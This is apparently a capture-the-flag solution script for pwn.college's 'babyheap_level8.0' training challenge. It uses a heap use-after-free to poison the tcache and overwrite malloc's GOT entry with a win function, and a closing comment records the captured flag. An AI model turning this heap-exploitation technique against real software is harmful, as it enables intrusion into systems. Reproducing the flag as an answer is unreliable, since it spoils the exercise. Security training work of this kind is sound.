from pwn import *

def _malloc(index, size):
    io.sendlineafter(b": ", b"malloc")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ",  str(size).encode())

def _free(index):
    io.sendlineafter(b": ", b"free")
    io.sendlineafter(b"Index: ", str(index).encode())

def _puts(index):
    io.sendlineafter(b": ", b"puts")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.recvuntil(b'Data: ')
    return io.recvline().strip()

def _scanf(index, data):
    io.sendlineafter(b": ", b"scanf")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendline(data)

def _send_flag(sec):
    io.sendlineafter(b": ", b"send_flag")
    io.sendlineafter(b"Secret: ", sec)

elf = ELF("./babyheap_level8.0")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyheap_level8.0")

_malloc(0, 64); _malloc(1, 64)
_free(1); _free(0)

_scanf(0, p64(elf.got['malloc']))
_malloc(2, 64); _malloc(3, 64)

_scanf(3, p64(elf.sym[b'win']) + p64(0))

io.interactive()
# Flag: pwn.college{4NYUPjUq2EyNMMryOtpo0kWDeUP.0FN4MDLxIjNyEzW}